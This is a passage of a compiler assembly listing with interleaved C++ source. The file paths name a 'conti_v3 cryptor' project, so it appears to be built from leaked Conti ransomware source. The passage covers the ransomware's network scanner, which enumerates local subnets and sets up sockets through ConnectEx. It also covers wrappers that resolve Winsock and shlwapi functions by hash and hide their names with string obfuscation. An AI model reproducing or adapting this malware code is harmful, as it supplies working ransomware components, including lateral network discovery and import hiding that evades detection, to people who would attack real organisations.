  003f5	48 89 08	 mov	 QWORD PTR [rax], rcx
  003f8	48 8b 85 78 02
	00 00		 mov	 rax, QWORD PTR NewSubnet$23[rbp]
  003ff	48 83 c0 08	 add	 rax, 8
  00403	48 8b 8d a0 06
	00 00		 mov	 rcx, QWORD PTR SubnetList$[rbp]
  0040a	48 89 41 08	 mov	 QWORD PTR [rcx+8], rax
  0040e	33 c0		 xor	 eax, eax
  00410	85 c0		 test	 eax, eax
  00412	75 aa		 jne	 SHORT $LN10@GetSubnets
$LN17@GetSubnets:
$LN14@GetSubnets:

; 213  : 
; 214  : 			}
; 215  : 
; 216  : 		}
; 217  : 	}

  00414	e9 16 fd ff ff	 jmp	 $LN2@GetSubnets
$LN3@GetSubnets:

; 218  : 
; 219  : 	free(IpNetTable);

  00419	48 8b 4d 28	 mov	 rcx, QWORD PTR IpNetTable$[rbp]
  0041d	e8 00 00 00 00	 call	 free

; 220  : 	return TRUE;

  00422	b8 01 00 00 00	 mov	 eax, 1
$LN1@GetSubnets:
$LN19@GetSubnets:

; 221  : }

  00427	48 8b f8	 mov	 rdi, rax
  0042a	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  0042e	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcFrameData
  00435	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  0043a	48 8b c7	 mov	 rax, rdi
  0043d	48 8b 8d 78 06
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00444	48 33 cd	 xor	 rcx, rbp
  00447	e8 00 00 00 00	 call	 __security_check_cookie
  0044c	48 8d a5 88 06
	00 00		 lea	 rsp, QWORD PTR [rbp+1672]
  00453	5f		 pop	 rdi
  00454	5d		 pop	 rbp
  00455	c3		 ret	 0
?GetSubnets@@YAHPEAUsubnet_list_@@@Z ENDP		; GetSubnets
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?GetConnectEX@@YAHXZ
_TEXT	SEGMENT
dwBytes$ = 4
rc$ = 36
sock$ = 72
guid$ = 104
__$ArrayPad$ = 328
?GetConnectEX@@YAHXZ PROC				; GetConnectEX, COMDAT

; 108  : {

$LN6:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec a8 01
	00 00		 sub	 rsp, 424		; 000001a8H
  0000a	48 8d 6c 24 50	 lea	 rbp, QWORD PTR [rsp+80]
  0000f	48 8d 7c 24 50	 lea	 rdi, QWORD PTR [rsp+80]
  00014	b9 26 00 00 00	 mov	 ecx, 38			; 00000026H
  00019	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0001e	f3 ab		 rep stosd
  00020	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00027	48 33 c5	 xor	 rax, rbp
  0002a	48 89 85 48 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00031	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00038	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 109  : 	DWORD dwBytes;
; 110  : 	int rc;
; 111  : 
; 112  : 	SOCKET sock = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

  0003d	c7 44 24 28 00
	00 00 00	 mov	 DWORD PTR [rsp+40], 0
  00045	c7 44 24 20 00
	00 00 00	 mov	 DWORD PTR [rsp+32], 0
  0004d	45 33 c9	 xor	 r9d, r9d
  00050	41 b8 06 00 00
	00		 mov	 r8d, 6
  00056	ba 01 00 00 00	 mov	 edx, 1
  0005b	b9 02 00 00 00	 mov	 ecx, 2
  00060	e8 00 00 00 00	 call	 ?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z ; pWSASocketW
  00065	48 89 45 48	 mov	 QWORD PTR sock$[rbp], rax

; 113  : 	if (sock == INVALID_SOCKET)

  00069	48 83 7d 48 ff	 cmp	 QWORD PTR sock$[rbp], -1
  0006e	75 07		 jne	 SHORT $LN2@GetConnect

; 114  : 		return FALSE;

  00070	33 c0		 xor	 eax, eax
  00072	e9 a8 00 00 00	 jmp	 $LN1@GetConnect
$LN2@GetConnect:

; 115  : 
; 116  : 	GUID guid = WSAID_CONNECTEX;

  00077	c7 45 68 b9 07
	a2 25		 mov	 DWORD PTR guid$[rbp], 631375801 ; 25a207b9H
  0007e	b8 f3 dd 00 00	 mov	 eax, 56819		; 0000ddf3H
  00083	66 89 45 6c	 mov	 WORD PTR guid$[rbp+4], ax
  00087	b8 60 46 00 00	 mov	 eax, 18016		; 00004660H
  0008c	66 89 45 6e	 mov	 WORD PTR guid$[rbp+6], ax
  00090	c6 45 70 8e	 mov	 BYTE PTR guid$[rbp+8], 142 ; 0000008eH
  00094	c6 45 71 e9	 mov	 BYTE PTR guid$[rbp+9], 233 ; 000000e9H
  00098	c6 45 72 76	 mov	 BYTE PTR guid$[rbp+10], 118 ; 00000076H
  0009c	c6 45 73 e5	 mov	 BYTE PTR guid$[rbp+11], 229 ; 000000e5H
  000a0	c6 45 74 8c	 mov	 BYTE PTR guid$[rbp+12], 140 ; 0000008cH
  000a4	c6 45 75 74	 mov	 BYTE PTR guid$[rbp+13], 116 ; 00000074H
  000a8	c6 45 76 06	 mov	 BYTE PTR guid$[rbp+14], 6
  000ac	c6 45 77 3e	 mov	 BYTE PTR guid$[rbp+15], 62 ; 0000003eH

; 117  : 	rc = (int)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,

  000b0	48 c7 44 24 40
	00 00 00 00	 mov	 QWORD PTR [rsp+64], 0
  000b9	48 c7 44 24 38
	00 00 00 00	 mov	 QWORD PTR [rsp+56], 0
  000c2	48 8d 45 04	 lea	 rax, QWORD PTR dwBytes$[rbp]
  000c6	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  000cb	c7 44 24 28 08
	00 00 00	 mov	 DWORD PTR [rsp+40], 8
  000d3	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA ; g_ConnectEx
  000da	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  000df	41 b9 10 00 00
	00		 mov	 r9d, 16
  000e5	4c 8d 45 68	 lea	 r8, QWORD PTR guid$[rbp]
  000e9	ba 06 00 00 c8	 mov	 edx, -939524090		; c8000006H
  000ee	48 8b 4d 48	 mov	 rcx, QWORD PTR sock$[rbp]
  000f2	e8 00 00 00 00	 call	 ?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z ; pWSAIoctl
  000f7	89 45 24	 mov	 DWORD PTR rc$[rbp], eax

; 118  : 		&guid, sizeof(guid),
; 119  : 		&g_ConnectEx, sizeof(g_ConnectEx),
; 120  : 		&dwBytes, NULL, NULL);
; 121  : 
; 122  : 	if (rc != 0)

  000fa	83 7d 24 00	 cmp	 DWORD PTR rc$[rbp], 0
  000fe	74 04		 je	 SHORT $LN3@GetConnect

; 123  : 		return FALSE;

  00100	33 c0		 xor	 eax, eax
  00102	eb 1b		 jmp	 SHORT $LN1@GetConnect
$LN3@GetConnect:

; 124  : 
; 125  : 	rc =(int) pclosesocket(sock);

  00104	48 8b 4d 48	 mov	 rcx, QWORD PTR sock$[rbp]
  00108	e8 00 00 00 00	 call	 ?pclosesocket@@YAH_K@Z	; pclosesocket
  0010d	89 45 24	 mov	 DWORD PTR rc$[rbp], eax

; 126  : 	if (rc != 0)

  00110	83 7d 24 00	 cmp	 DWORD PTR rc$[rbp], 0
  00114	74 04		 je	 SHORT $LN4@GetConnect

; 127  : 		return FALSE;

  00116	33 c0		 xor	 eax, eax
  00118	eb 05		 jmp	 SHORT $LN1@GetConnect
$LN4@GetConnect:

; 128  : 
; 129  : 	return TRUE;

  0011a	b8 01 00 00 00	 mov	 eax, 1
$LN1@GetConnect:

; 130  : }

  0011f	48 8b f8	 mov	 rdi, rax
  00122	48 8d 4d b0	 lea	 rcx, QWORD PTR [rbp-80]
  00126	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?GetConnectEX@@YAHXZ$rtcFrameData
  0012d	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  00132	48 8b c7	 mov	 rax, rdi
  00135	48 8b 8d 48 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  0013c	48 33 cd	 xor	 rcx, rbp
  0013f	e8 00 00 00 00	 call	 __security_check_cookie
  00144	48 8d a5 58 01
	00 00		 lea	 rsp, QWORD PTR [rbp+344]
  0014b	5f		 pop	 rdi
  0014c	5d		 pop	 rbp
  0014d	c3		 ret	 0
?GetConnectEX@@YAHXZ ENDP				; GetConnectEX
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?GetCurrentIpAddress@@YAKXZ
_TEXT	SEGMENT
szHostName$ = 16
__$ArrayPad$ = 504
?GetCurrentIpAddress@@YAKXZ PROC			; GetCurrentIpAddress, COMDAT

; 89   : {

$LN5:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 28 02
	00 00		 sub	 rsp, 552		; 00000228H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00014	b9 52 00 00 00	 mov	 ecx, 82			; 00000052H
  00019	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0001e	f3 ab		 rep stosd
  00020	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00027	48 33 c5	 xor	 rax, rbp
  0002a	48 89 85 f8 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00031	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00038	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 90   : 	CHAR szHostName[256];
; 91   : 	struct in_addr InAddr;
; 92   : 
; 93   : 	if (SOCKET_ERROR == (INT)pgethostname(szHostName, 256)) {

  0003d	ba 00 01 00 00	 mov	 edx, 256		; 00000100H
  00042	48 8d 4d 10	 lea	 rcx, QWORD PTR szHostName$[rbp]
  00046	e8 00 00 00 00	 call	 ?pgethostname@@YAHPEADH@Z ; pgethostname
  0004b	83 f8 ff	 cmp	 eax, -1
  0004e	75 04		 jne	 SHORT $LN2@GetCurrent

; 94   : 		return 0;

  00050	33 c0		 xor	 eax, eax
  00052	eb 20		 jmp	 SHORT $LN1@GetCurrent
$LN2@GetCurrent:

; 95   : 	}
; 96   : 
; 97   : 	g_HostEntry = (struct hostent*)pgethostbyname(szHostName);

  00054	48 8d 4d 10	 lea	 rcx, QWORD PTR szHostName$[rbp]
  00058	e8 00 00 00 00	 call	 ?pgethostbyname@@YAPEAUhostent@@PEBD@Z ; pgethostbyname
  0005d	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_HostEntry@@3PEAUhostent@@EA, rax ; g_HostEntry

; 98   : 	if (!g_HostEntry) {

  00064	48 83 3d 00 00
	00 00 00	 cmp	 QWORD PTR ?g_HostEntry@@3PEAUhostent@@EA, 0 ; g_HostEntry
  0006c	75 04		 jne	 SHORT $LN3@GetCurrent

; 99   : 		return 0;

  0006e	33 c0		 xor	 eax, eax
  00070	eb 02		 jmp	 SHORT $LN1@GetCurrent
$LN3@GetCurrent:

; 100  : 	}
; 101  : 
; 102  : 	return 0;

  00072	33 c0		 xor	 eax, eax
$LN1@GetCurrent:

; 103  : }

  00074	48 8b f8	 mov	 rdi, rax
  00077	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  0007b	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?GetCurrentIpAddress@@YAKXZ$rtcFrameData
  00082	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  00087	48 8b c7	 mov	 rax, rdi
  0008a	48 8b 8d f8 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00091	48 33 cd	 xor	 rcx, rbp
  00094	e8 00 00 00 00	 call	 __security_check_cookie
  00099	48 8d a5 08 02
	00 00		 lea	 rsp, QWORD PTR [rbp+520]
  000a0	5f		 pop	 rdi
  000a1	5d		 pop	 rbp
  000a2	c3		 ret	 0
?GetCurrentIpAddress@@YAKXZ ENDP			; GetCurrentIpAddress
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?positive_modulo@@YAHHH@Z
_TEXT	SEGMENT
a$ = 224
n$ = 232
?positive_modulo@@YAHHH@Z PROC				; positive_modulo, COMDAT

; 39   : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00008	55		 push	 rbp
  00009	57		 push	 rdi
  0000a	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00011	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00016	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001d	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 40   :     return (a % n + n) % n;

  00022	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  00028	99		 cdq
  00029	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0002f	8b c2		 mov	 eax, edx
  00031	03 85 e8 00 00
	00		 add	 eax, DWORD PTR n$[rbp]
  00037	99		 cdq
  00038	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0003e	8b c2		 mov	 eax, edx

; 41   : }

  00040	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00047	5f		 pop	 rdi
  00048	5d		 pop	 rbp
  00049	c3		 ret	 0
?positive_modulo@@YAHHH@Z ENDP				; positive_modulo
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pinet_ntoa@@YAPEADUin_addr@@@Z
_TEXT	SEGMENT
pFunction$ = 8
in$ = 256
?pinet_ntoa@@YAPEADUin_addr@@@Z PROC			; pinet_ntoa, COMDAT

; 1288 : {

$LN3:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1289 : 	char*(WINAPI * pFunction)(in_addr);
; 1290 : 	pFunction = (char*(WINAPI*)(in_addr))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x464a1063, 2);

  0001e	41 b9 02 00 00
	00		 mov	 r9d, 2
  00024	41 b8 63 10 4a
	46		 mov	 r8d, 1179258979		; 464a1063H
  0002a	ba 15 00 00 00	 mov	 edx, 21
  0002f	33 c9		 xor	 ecx, ecx
  00031	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00036	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 1291 : 	return pFunction(in);

  0003a	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR in$[rbp]
  00040	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 1292 : }

  00043	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
?pinet_ntoa@@YAPEADUin_addr@@@Z ENDP			; pinet_ntoa
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pStrStrIA@@YAPEBDPEBD0@Z
_TEXT	SEGMENT
pFunction$ = 8
pszFirst$ = 256
pszSrch$ = 264
?pStrStrIA@@YAPEBDPEBD0@Z PROC				; pStrStrIA, COMDAT

; 994  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 995  : 	PCSTR(WINAPI * pFunction)(PCSTR, PCSTR);
; 996  : 	pFunction = (PCSTR(WINAPI*)(PCSTR, PCSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0x4c07f7e3, 24);//GetProcAddress(hShlwapi, OBFA("StrStrIA"));

  00024	41 b9 18 00 00
	00		 mov	 r9d, 24
  0002a	41 b8 e3 f7 07
	4c		 mov	 r8d, 1275590627		; 4c07f7e3H
  00030	ba 16 00 00 00	 mov	 edx, 22
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 997  : 	return pFunction(pszFirst, pszSrch);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR pszSrch$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR pszFirst$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 998  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?pStrStrIA@@YAPEBDPEBD0@Z ENDP				; pStrStrIA
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSACleanup@@YAHXZ
_TEXT	SEGMENT
pFunction$ = 8
?pWSACleanup@@YAHXZ PROC				; pWSACleanup, COMDAT

; 972  : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 973  : 	int(WINAPI * pFunction)();
; 974  : 	pFunction = (int(WINAPI*)())getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xc84f6620, 26);//GetProcAddress(hWs2_32, OBFA("WSACleanup"));

  0001b	41 b9 1a 00 00
	00		 mov	 r9d, 26
  00021	41 b8 20 66 4f
	c8		 mov	 r8d, -934320608		; c84f6620H
  00027	ba 15 00 00 00	 mov	 edx, 21
  0002c	33 c9		 xor	 ecx, ecx
  0002e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00033	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 975  : 	return pFunction();

  00037	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 976  : }

  0003a	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?pWSACleanup@@YAHXZ ENDP				; pWSACleanup
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSAStartup@@YAHGPEAUWSAData@@@Z
_TEXT	SEGMENT
pFunction$ = 8
wVersionRequired$ = 256
lpWSAData$ = 264
?pWSAStartup@@YAHGPEAUWSAData@@@Z PROC			; pWSAStartup, COMDAT

; 965  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	66 89 4c 24 08	 mov	 WORD PTR [rsp+8], cx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 966  : 	int(WINAPI * pFunction)(WORD, LPWSADATA);
; 967  : 	pFunction = (int(WINAPI*)(WORD, LPWSADATA))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x86ffe89f, 27);//GetProcAddress(hWs2_32, OBFA("WSAStartup"));

  00024	41 b9 1b 00 00
	00		 mov	 r9d, 27
  0002a	41 b8 9f e8 ff
	86		 mov	 r8d, -2030049121	; 86ffe89fH
  00030	ba 15 00 00 00	 mov	 edx, 21
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 968  : 	return pFunction(wVersionRequired, lpWSAData);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpWSAData$[rbp]
  00047	0f b7 8d 00 01
	00 00		 movzx	 ecx, WORD PTR wVersionRequired$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 969  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?pWSAStartup@@YAHGPEAUWSAData@@@Z ENDP			; pWSAStartup
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pshutdown@@YAH_KH@Z
_TEXT	SEGMENT
pFunction$ = 8
s$ = 256
how$ = 264
?pshutdown@@YAH_KH@Z PROC				; pshutdown, COMDAT

; 955  : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 956  : 	int(WINAPI * pFunction)(SOCKET, int);
; 957  : 	pFunction = (int(WINAPI*)(SOCKET, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8f9390c3, 28);//GetProcAddress(hWs2_32, OBFA("shutdown"));

  00023	41 b9 1c 00 00
	00		 mov	 r9d, 28
  00029	41 b8 c3 90 93
	8f		 mov	 r8d, -1886154557	; 8f9390c3H
  0002f	ba 15 00 00 00	 mov	 edx, 21
  00034	33 c9		 xor	 ecx, ecx
  00036	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003b	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 958  : 	return pFunction(s, how);

  0003f	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR how$[rbp]
  00045	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR s$[rbp]
  0004c	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 959  : }

  0004f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00056	5f		 pop	 rdi
  00057	5d		 pop	 rbp
  00058	c3		 ret	 0
?pshutdown@@YAH_KH@Z ENDP				; pshutdown
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pgetsockopt@@YAH_KHHPEADPEAH@Z
_TEXT	SEGMENT
pFunction$ = 8
s$ = 256
level$ = 264
optname$ = 272
optval$ = 280
optlen$ = 288
?pgetsockopt@@YAH_KHHPEADPEAH@Z PROC			; pgetsockopt, COMDAT

; 945  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001c	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00021	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00028	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 946  : 	int(WINAPI * pFunction)(SOCKET, int, int, char*, int*);
; 947  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, char*, int*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x1c5ed854, 29);//GetProcAddress(hWs2_32, OBFA("getsockopt"));

  0002d	41 b9 1d 00 00
	00		 mov	 r9d, 29
  00033	41 b8 54 d8 5e
	1c		 mov	 r8d, 475977812		; 1c5ed854H
  00039	ba 15 00 00 00	 mov	 edx, 21
  0003e	33 c9		 xor	 ecx, ecx
  00040	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00045	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 948  : 	return pFunction(s, level, optname, optval, optlen);

  00049	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR optlen$[rbp]
  00050	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  00055	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR optval$[rbp]
  0005c	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR optname$[rbp]
  00063	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR level$[rbp]
  00069	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR s$[rbp]
  00070	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 949  : }

  00073	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0007a	5f		 pop	 rdi
  0007b	5d		 pop	 rbp
  0007c	c3		 ret	 0
?pgetsockopt@@YAH_KHHPEADPEAH@Z ENDP			; pgetsockopt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?psetsockopt@@YAH_KHHPEBDH@Z
_TEXT	SEGMENT
pFunction$ = 8
s$ = 256
level$ = 264
optname$ = 272
optval$ = 280
optlen$ = 288
?psetsockopt@@YAH_KHHPEBDH@Z PROC			; psetsockopt, COMDAT

; 932  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001c	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00021	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00028	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 933  : 	int(WINAPI * pFunction)(SOCKET, int, int, const char*, int);
; 934  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, const char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x33b7fed1, 30);//GetProcAddress(hWs2_32, OBFA("setsockopt"));

  0002d	41 b9 1e 00 00
	00		 mov	 r9d, 30
  00033	41 b8 d1 fe b7
	33		 mov	 r8d, 867696337		; 33b7fed1H
  00039	ba 15 00 00 00	 mov	 edx, 21
  0003e	33 c9		 xor	 ecx, ecx
  00040	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00045	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 935  : 	return pFunction(s, level, optname, optval, optlen);

